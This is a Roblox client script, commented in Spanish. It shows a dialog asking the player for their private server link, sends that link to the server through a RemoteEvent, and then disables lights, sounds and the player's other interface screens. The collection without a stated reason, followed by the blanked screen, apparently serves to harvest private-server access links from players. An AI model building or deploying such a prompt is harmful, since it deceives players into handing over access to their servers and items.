local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")

-- Crear UI
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local Button = Instance.new("TextButton")
local Label = Instance.new("TextLabel")

ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100

-- Frame más grande
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 250) -- más ancho y alto
Frame.Position = UDim2.new(0.5, -200, 0.5, -125)
Frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
Frame.BorderSizePixel = 0
Frame.ZIndex = 10

-- Label
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.new(1, 1, 1)
Label.BackgroundTransparency = 1
Label.ZIndex = 11

-- TextBox más grande
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.new(1, 1, 1)
TextBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/games/"
TextBox.ZIndex = 12

-- Button
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 120)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
Button.TextColor3 = Color3.new(1, 1, 1)
Button.ZIndex = 13

-- Validar link
local function isValidLink(link)
    return string.find(link, "https://www.roblox.com/games/") ~= nil
end

-- Congelar el entorno correctamente
local function freezeEnvironment()
    -- Apagar luces en Workspace
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("Light") then
            obj.Enabled = false
        end
    end

    -- Detener sonidos en Workspace y SoundService
    for _, sound in pairs(Workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound:Stop()
            sound.Volume = 0
        end
    end
    for _, sound in pairs(SoundService:GetChildren()) do
        if sound:IsA("Sound") then
            sound:Stop()
            sound.Volume = 0
        end
    end

    -- Ocultar GUIs del jugador
    for _, gui in pairs(Player:WaitForChild("PlayerGui"):GetChildren()) do
        if gui:IsA("ScreenGui") then
            gui.Enabled = false
        end
    end
end

-- Botón
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    if isValidLink(link) then
        local remoteEvent = ReplicatedStorage:WaitForChild("SendServerLink")
        remoteEvent:FireServer(link)
        freezeEnvironment()
    else
        print("El link no es válido")
    end
end)
